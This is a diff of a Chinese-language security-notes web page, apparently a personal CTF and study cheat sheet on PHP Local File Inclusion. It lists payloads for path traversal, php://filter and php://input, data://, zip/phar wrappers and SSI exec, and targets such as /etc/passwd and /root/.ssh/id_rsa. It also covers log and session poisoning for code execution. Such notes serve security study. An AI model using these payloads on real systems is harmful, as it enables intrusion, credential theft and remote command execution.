@@ -103,7 +103,7 @@
     <div class="Page__header">
         <h1><a href="../Web_Application_Attack/Misc.html">Web Application Attack</a> <svg class="Page__header--separator" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175"><path d="M360.73 229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1 0s-5.3 13.8 0 19.1l215.5 215.5-215.5 215.5c-5.3 5.3-5.3 13.8 0 19.1 2.6 2.6 6.1 4 9.5 4 3.4 0 6.9-1.3 9.5-4l225.1-225.1c5.3-5.2 5.3-13.8.1-19z"/></svg> <a href="../Web_Application_Attack/FLI_(Local_File_Inclusion).html">FLI (Local File Inclusion)</a></h1>
                 <span class="ModifiedDate">
-            February 16, 2021 at 1:22 AM        </span>
+            February 16, 2021 at 1:23 AM        </span>
                         <span class="EditOn">
             <a href="https://github.com/WildfootW/Security-Note/blob/master/docs/120_Web_Application_Attack/110_FLI_(Local_File_Inclusion).md" target="_blank">
                 Edit on GitHub            </a>
@@ -111,7 +111,396 @@
             </div>
 
     <div class="s-content">
-            </div>
+        <h1 id="page_FLI_(Local_File_Inclusion)">FLI (Local File Inclusion)</h1>
+<div class="TableOfContentsContainer">
+    <h4 class="TableOfContentsContainer__title">Table of Contents</h4>
+    <div class="TableOfContentsContainer__content">
+        <ul class="TableOfContents">
+<li>
+<p><a href="#page_FLI_(Local_File_Inclusion)">FLI (Local File Inclusion)</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tags">tags: <code>Security</code> <code>Web</code></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_chang_jian_chang_jing">常見場景</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_PHP">PHP</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Target">Target</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Config">Config</a></p>
+</li>
+<li>
+<p><a href="#page_proc*">/proc/*</a></p>
+</li>
+<li>
+<p><a href="#page_huan_jing_bian_shu">環境變數</a></p>
+</li>
+<li>
+<p><a href="#page_log_file">log file</a></p>
+</li>
+<li>
+<p><a href="#page_RCE_Tricks">RCE Tricks</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Session_ke_kong">Session 可控</a></p>
+</li>
+<li>
+<p><a href="#page_cun_zai_phpinfo">存在 phpinfo</a></p>
+</li>
+<li>
+<p><a href="#page_log_file_ke_du">log file 可讀</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Payloads">Payloads</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Linux_Unix">Linux / Unix</a></p>
+</li>
+<li>
+<p><a href="#page_Windows">Windows</a></p>
+</li>
+<li>
+<p><a href="#page_phpfilter">php://filter</a></p>
+</li>
+<li>
+<p><a href="#page_phpinput">php://input</a></p>
+</li>
+<li>
+<p><a href="#page_data">data://</a></p>
+</li>
+<li>
+<p><a href="#page_zip_phar">zip / phar</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Others">Others</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_SSI_(Server_Side_Includes)">SSI (Server Side Includes)</a></p>
+</li>
+</ul>
+</li>
+</ul>    </div>
+</div>
+<h6 id="page_tags">tags: <code>Security</code> <code>Web</code></h6>
+<h1 id="page_chang_jian_chang_jing">常見場景</h1>
+<h2 id="page_PHP">PHP</h2>
+<ul>
+<li>
+<code>include()</code>
+</li>
+<li>
+<code>requir()</code>
+</li>
+<li>
+<code>include_once()</code>
+</li>
+<li>
+<code>require_once()</code>
+</li>
+</ul>
+<h1 id="page_Target">Target</h1>
+<h2 id="page_Config">Config</h2>
+<pre><code>/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+/etc/apache2/sites-available/000-default.conf
+/etc/php/php.ini
+</code></pre>
+<h2 id="page_proc*">/proc/*</h2>
+<pre><code>/proc/self/cmdline  // 執⾏時的 Command
+/proc/self/exe      // 撈執⾏檔 (可以串 reverse/pwn)
+/proc/self/environ  // 環境變數
+/proc/self/fd/*     // filedescriptor
+</code></pre>
+<h2 id="page_huan_jing_bian_shu">環境變數</h2>
+<ul>
+<li>
+<code>../../../../proc/self/environ</code>
+<ul>
+<li>HTTP_User_Agent 塞 php script</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_log_file">log file</h2>
+<p>可配合 RCE Tricks</p>
+<pre><code>access.log
+error.log
+</code></pre>
+<ul>
+<li>apache log</li>
+<li>mysql log</li>
+<li>mail log</li>
+<li>ssh log
+<ul>
+<li>
+<code>/var/log/auth.log</code>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_RCE_Tricks">RCE Tricks</h2>
+<p>把 code 傳到目標上後，再進行 LFI</p>
+<h3 id="page_Session_ke_kong">Session 可控</h3>
+<p>各個版本的 php ， session 存放位置不同 <a href="https://stackoverflow.com/questions/4927850/location-for-session-files-in-apache-php" class="Link--external" rel="noopener noreferrer">stackoverflow</a></p>
+<ul>
+<li>常見存放路徑</li>
+</ul>
+<pre><code>/var/lib/php/sessions/sess_[session id]
+/var/lib/php/session/sess_[session id]
+/var/lib/php/
+/var/lib/php5/
+/var/tmp/
+/tmp/
+</code></pre>
+<ul>
+<li>
+<code>session.upload_progress</code>
+<ul>
+<li>PHP預設開啟</li>
+<li>用來監控上傳檔案進度</li>
+<li>當 <code>session.upload_progress.enabled</code> 開啟，可以 POST 在 <code>$_SESSION</code> 中添加資料</li>
+<li>
+<code>session.upload_progress.cleanup=on</code>時，可以透過 Race condition</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_cun_zai_phpinfo">存在 phpinfo</h3>
+<p>可以在 phpinfo 看到上傳暫存檔的位置，對 server 以 form-data 硬傳檔案，會產生 tmp 檔 &amp; Race condition =&gt; LFI Get shell</p>
+<ul>
+<li>Ubuntu 17後，預設開啟<code>PrivateTmp</code>，無法利用</li>
+</ul>
+<h3 id="page_log_file_ke_du">log file 可讀</h3>
+<p>寫在 <code>User-Agent / URL</code></p>
+<h1 id="page_Payloads">Payloads</h1>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" class="Link--external" rel="noopener noreferrer">GitHub: swisskyrepo/PayloadsAllTheThings</a></p>
+<pre><code>curl http://kioptrix3.com/index.php\?system\=../../../../../etc/passwd%00W
+</code></pre>
+<h2 id="page_Linux_Unix">Linux / Unix</h2>
+<ul>
+<li>
+<code>./index.php</code>
+</li>
+<li>
+<code>././index.php</code>
+</li>
+<li>
+<code>.//index.php</code>
+</li>
+<li>
+<code>../../../../../../etc/passwd</code>
+</li>
+<li>
+<code>../../../../../../etc/passwd%00</code>
+<ul>
+<li>僅在5.3.0以下可用</li>
+<li>magic_quotes_gpc需為OFF</li>
+</ul>
+</li>
+<li>
+<code>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code>
+</li>
+<li>
+<code>ＮＮ/ＮＮ/ＮＮ/etc/passwd</code>
+</li>
+<li>
+<code>/var/log/apache2/error.log</code>
+</li>
+<li>
+<code>/var/log/httpd/access_log</code>
+</li>
+<li>
+<code>/var/log/mail.log</code>
+</li>
+<li>
+<code>/usr/local/apache2/conf/httpd.conf</code>
+</li>
+<li>
+<code>/etc/apache2/apache2.conf</code>
+</li>
+<li>
+<code>/etc/apache2/httpd.conf</code>
+</li>
+<li>
+<code>/etc/apache2/sites-available/000-default.conf</code>
+</li>
+<li>
+<code>/usr/local/etc/apache2/httpd.conf</code>
+</li>
+<li>
+<code>/etc/nginx/conf.d/default.conf</code>
+</li>
+<li>
+<code>/etc/nginx/nginx.conf</code>
+</li>
+<li>
+<code>/etc/nginx/sites-enabled/default</code>
+</li>
+<li>
+<code>/etc/nginx/sites-enabled/default.conf</code>
+</li>
+<li>
+<code>/proc/net/fib_trie</code>
+</li>
+<li>
+<code>.htaccess</code>
+</li>
+<li>
+<code>/root/.bash_history</code>
+</li>
+<li>
+<code>/root/.ssh/id_rsa</code>
+</li>
+<li>
+<code>/root/.ssh/authorized_keys</code>
+</li>
+</ul>
+<h2 id="page_Windows">Windows</h2>
+<ul>
+<li>
+<code>C:/Windows/win.ini</code>
+</li>
+<li>
+<code>C:/boot.ini</code>
+</li>
+<li>
+<code>C:/apache/logs/access.log</code>
+</li>
+<li>
+<code>../../../../../../../../../boot.ini/.......................</code>
+</li>
+<li>
+<code>C:/windows/system32/drivers/etc/hosts</code>
+</li>
+</ul>
+<h2 id="page_phpfilter">php://filter</h2>
+<ul>
+<li>
+<code>php://filter/convert.base64-encode/resource=index.php</code>
+</li>
+<li>
+<code>php://filter/convert.base64-decode/resource=index.php</code>
+</li>
+<li>
+<code>php://filter/read=string.rot13/resource=index.php</code>
+</li>
+<li>
+<code>php://filter/zlib.deflate/resource=index.php</code>
+</li>
+<li>
+<code>php://filter/zlib.inflate/resource=index.php</code>
+</li>
+<li>
+<code>php://filter/convert.quoted-printable-encode/resource=index.php</code>
+</li>
+<li>
+<code>php://filter/read=string.strip_tags/resource=php://input</code>
+</li>
+<li>
+<code>php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=index.php</code>
+</li>
+<li>
+<code>php://filter/convert.iconv.UCS-4LE.UCS-4BE/resource=index.php</code>
+</li>
+</ul>
+<h2 id="page_phpinput">php://input</h2>
+<ul>
+<li>
+<code>?page=php://input</code>
+<ul>
+<li>post data: <code>&lt;?php system(&quot;net user&quot;); ?&gt;</code>
+</li>
+<li>需要有開啟<code>url_allow_include</code>，5.4.0直接廢除</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_data">data://</h2>
+<ul>
+<li>條件
+<ul>
+<li>allow_url_fopen: On</li>
+<li>allow_url_include: On</li>
+</ul>
+</li>
+<li>用法
+<ul>
+<li>
+<code>?file=data://text/plain,&lt;?php phpinfo()?&gt;</code>
+</li>
+<li>
+<code>?file=data:text/plain,&lt;?php phpinfo()?&gt;</code>
+</li>
+<li>
+<code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_zip_phar">zip / phar</h2>
+<ul>
+<li>適用驗證副檔名時</li>
+<li>zip
+<ul>
+<li>新建zip，裡頭壓縮php腳本(可改副檔名)</li>
+<li>
+<code>?file=zip://myzip.zip#php.jpg</code>
+</li>
+</ul>
+</li>
+<li>phar
+<ul>
+<li>
+<pre><code class="hljs php">  <span class="hljs-meta">&lt;?php</span>
+      $p = <span class="hljs-keyword">new</span> PharData(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">'/phartest.zip'</span>,<span class="hljs-number">0</span>,<span class="hljs-string">'phartest2'</span>,Phar::ZIP);
+      $x = file_get_contents(<span class="hljs-string">'./a.php'</span>);
+      $p-&gt;addFromString(<span class="hljs-string">'b.jpg'</span>, $x);
+  <span class="hljs-meta">?&gt;</span>
+</code></pre>
+</li>
+<li>構造 <code>?file=phar://phartest.zip/b.jpg</code>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="page_Others">Others</h1>
+<h2 id="page_SSI_(Server_Side_Includes)">SSI (Server Side Includes)</h2>
+<ul>
+<li>通常放在<code>.shtml</code>, <code>.shtm</code>
+</li>
+<li>Execute Command
+<ul>
+<li>
+<code>&lt;!--#exec cmd=&quot;command&quot;--&gt;</code>
+</li>
+</ul>
+</li>
+<li>File Include
+<ul>
+<li>
+<code>&lt;!--#include file=&quot;../../web.config&quot;--&gt;</code>
+</li>
+</ul>
+</li>
+<li>Example
+<ul>
+<li>HITCON CTF 2018 - Why so Serials?</li>
+</ul>
+</li>
+</ul>
+    </div>
 
         <nav>
         <ul class="Pager">
